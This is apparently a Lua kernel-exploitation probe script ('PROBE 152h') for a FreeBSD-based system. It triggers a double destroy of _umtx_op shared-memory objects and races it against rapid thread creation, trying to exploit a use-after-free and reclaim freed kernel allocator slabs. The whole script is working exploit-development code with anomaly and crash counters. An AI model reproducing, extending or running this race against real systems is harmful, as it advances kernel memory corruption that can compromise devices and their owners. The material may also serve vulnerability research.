-- CRASH_CLASS: HIGH
-- PROBE 152h: Thread creation pressure + SHM race
--
-- Context: 152g showed UMA cache holds freed SHM regs without reuse.
-- 500 same-type SHM sprays didn't reclaim the freed slabs.
--
-- New approach: rapid thread creation/destruction creates kernel
-- allocator pressure (thread stacks, PCBs, credentials). Interleave
-- with SHM create/destroy to widen the race window.
--
-- Also test: alive() semantics after destroy - does it mean "found"
-- or "not found"? Need to test with a key that was never created.

print("=== PROBE 152h: THREAD PRESSURE + SHM RACE ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function fmt_addr(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end

collectgarbage("stop")
local pid = to_num(syscall.getpid())
print("pid=" .. pid)

if not libc_addrofs or not libc_addrofs.Thrd_create then
    print("ERROR: no threading"); print("canary=" .. pid); return
end

local sc_umtx = make_syscall(454)
local thrd_create_fn = fcall(libc_addrofs.Thrd_create)
local thrd_join_fn = fcall(libc_addrofs.Thrd_join)
local key = memory.alloc(0x20)

-- ============================================================
-- SECTION A: Clarify alive() return semantics
-- ============================================================
print("")
print("--- SECTION A: ALIVE SEMANTICS ---")

-- Test with a key that was NEVER created
memory.write_qword(key, uint64(0x99999999))
local ok_nv, r_nv = pcall(function()
    return sc_umtx(uint64(to_num(key)), uint64(25), uint64(8), uint64(0), uint64(0))
end)
print("never_created: ok=" .. tostring(ok_nv) .. " ret=" .. (ok_nv and tostring(r_nv) or "crash"))

-- Create then destroy normally
memory.write_qword(key, uint64(0x88888888))
pcall(function()
    sc_umtx(uint64(to_num(key)), uint64(25), uint64(1), uint64(0), uint64(0))
end)
local ok_alive1, r_alive1 = pcall(function()
    return sc_umtx(uint64(to_num(key)), uint64(25), uint64(8), uint64(0), uint64(0))
end)
print("after_create: ok=" .. tostring(ok_alive1) .. " ret=" .. (ok_alive1 and tostring(r_alive1) or "crash"))

pcall(function()
    sc_umtx(uint64(to_num(key)), uint64(25), uint64(4), uint64(0), uint64(0))
end)
local ok_alive2, r_alive2 = pcall(function()
    return sc_umtx(uint64(to_num(key)), uint64(25), uint64(8), uint64(0), uint64(0))
end)
print("after_destroy: ok=" .. tostring(ok_alive2) .. " ret=" .. (ok_alive2 and tostring(r_alive2) or "crash"))

-- Double destroy then alive
memory.write_qword(key, uint64(0x77777777))
pcall(function()
    sc_umtx(uint64(to_num(key)), uint64(25), uint64(1), uint64(0), uint64(0))
end)
pcall(function()
    sc_umtx(uint64(to_num(key)), uint64(25), uint64(4), uint64(0), uint64(0))
end)
pcall(function()
    sc_umtx(uint64(to_num(key)), uint64(25), uint64(4), uint64(0), uint64(0))
end)
local ok_alive3, r_alive3 = pcall(function()
    return sc_umtx(uint64(to_num(key)), uint64(25), uint64(8), uint64(0), uint64(0))
end)
print("after_dd: ok=" .. tostring(ok_alive3) .. " ret=" .. (ok_alive3 and tostring(r_alive3) or "crash"))

-- ============================================================
-- SECTION B: Thread creation storm + SHM interleave
-- Create and immediately join threads in tight loop while
-- doing SHM create/destroy on same key
-- ============================================================
print("")
print("--- SECTION B: THREAD STORM + SHM ---")

local thr_buf = memory.alloc(8)
local counter = memory.alloc(64)
memory.write_qword(counter, uint64(0))

local thread_ok = 0
local thread_fail = 0
local shm_anomaly = 0

for i = 1, 50 do
    -- SHM create
    memory.write_qword(key, uint64(0xBEEF0000 + i))
    pcall(function()
        sc_umtx(uint64(to_num(key)), uint64(25), uint64(1), uint64(0), uint64(0))
    end)

    -- Spawn thread (kernel allocates stack + PCB)
    memory.write_qword(thr_buf, uint64(0))
    local ok_t, ret_t = pcall(thrd_create_fn, thr_buf, libc_addrofs.Atomic_fetch_add_8, counter)
    if ok_t and to_num(ret_t) == 0 then
        thread_ok = thread_ok + 1
        -- SHM destroy while thread is being set up
        pcall(function()
            sc_umtx(uint64(to_num(key)), uint64(25), uint64(4), uint64(0), uint64(0))
        end)
        -- Double destroy
        local ok_dd, r_dd = pcall(function()
            return sc_umtx(uint64(to_num(key)), uint64(25), uint64(4), uint64(0), uint64(0))
        end)
        if ok_dd and to_num(r_dd) ~= 0 then
            shm_anomaly = shm_anomaly + 1
            print(string.format("ANOMALY i=%d dd_ret=%s", i, tostring(r_dd)))
        end

        -- Join thread
        sleep(0.01, 's')
        local tid = memory.read_qword(thr_buf)
        pcall(thrd_join_fn, tid, uint64(0))
    else
        thread_fail = thread_fail + 1
    end
end
print(string.format("threads: ok=%d fail=%d anomalies=%d", thread_ok, thread_fail, shm_anomaly))

-- ============================================================
-- SECTION C: Batch thread spawn (no join) + SHM race
-- Spawn many threads without joining to maximize concurrency
-- ============================================================
print("")
print("--- SECTION C: BATCH SPAWN + SHM RACE ---")

local batch_threads = {}
local batch_counter = memory.alloc(64)
memory.write_qword(batch_counter, uint64(0))

-- Spawn 10 threads that will all run concurrently
for i = 1, 10 do
    local tb = memory.alloc(8)
    memory.write_qword(tb, uint64(0))
    local ok, ret = pcall(thrd_create_fn, tb, libc_addrofs.Atomic_fetch_add_8, batch_counter)
    if ok and to_num(ret) == 0 then
        batch_threads[#batch_threads + 1] = memory.read_qword(tb)
    end
end
print("batch_spawned=" .. #batch_threads)

-- While threads are initializing, hammer SHM
local shm_crash = 0
local shm_ok = 0
for i = 1, 200 do
    memory.write_qword(key, uint64(0xCAFE0000 + i))

    local ok_c = pcall(function()
        sc_umtx(uint64(to_num(key)), uint64(25), uint64(1), uint64(0), uint64(0))
    end)
    local ok_d1 = pcall(function()
        sc_umtx(uint64(to_num(key)), uint64(25), uint64(4), uint64(0), uint64(0))
    end)
    local ok_d2 = pcall(function()
        sc_umtx(uint64(to_num(key)), uint64(25), uint64(4), uint64(0), uint64(0))
    end)

    if ok_c and ok_d1 and ok_d2 then
        shm_ok = shm_ok + 1
    else
        shm_crash = shm_crash + 1
        if shm_crash >= 3 then
            print("too many SHM crashes at i=" .. i)
            break
        end
    end
end
print(string.format("shm_ops: ok=%d crash=%d", shm_ok, shm_crash))

-- Join batch threads
sleep(0.2, 's')
for _, tid in ipairs(batch_threads) do
    pcall(thrd_join_fn, tid, uint64(0))
end
print("batch joined, counter=" .. fmt_addr(memory.read_qword(batch_counter)))

-- ============================================================
-- SECTION D: UMTX_OP_WAIT as corruption detector
-- If SHM struct is corrupted, UMTX_OP_WAIT on same key may
-- follow corrupt pointers → different behavior
-- ============================================================
print("")
print("--- SECTION D: UMTX_OP_WAIT PROBE ---")

-- umtx_op with op=5 (UMTX_OP_WAIT) on a regular address
-- This uses a different code path but shares the umtx key lookup
local wait_addr = memory.alloc(64)
memory.write_dword(wait_addr, 0)

-- Try UMTX_OP_WAIT with timeout=0 (non-blocking check)
local ok_w, rw = pcall(function()
    return sc_umtx(uint64(to_num(wait_addr)), uint64(5), uint64(1), uint64(0), uint64(0))
end)
print("umtx_wait: ok=" .. tostring(ok_w) .. " ret=" .. (ok_w and tostring(rw) or "crash"))

-- UMTX_OP_WAKE
local ok_wk, rwk = pcall(function()
    return sc_umtx(uint64(to_num(wait_addr)), uint64(21), uint64(0x7FFFFFFF), uint64(0), uint64(0))
end)
print("umtx_wake: ok=" .. tostring(ok_wk) .. " ret=" .. (ok_wk and tostring(rwk) or "crash"))

print("")
print("canary=" .. to_num(syscall.getpid()))
print("=== PROBE 152h COMPLETE ===")
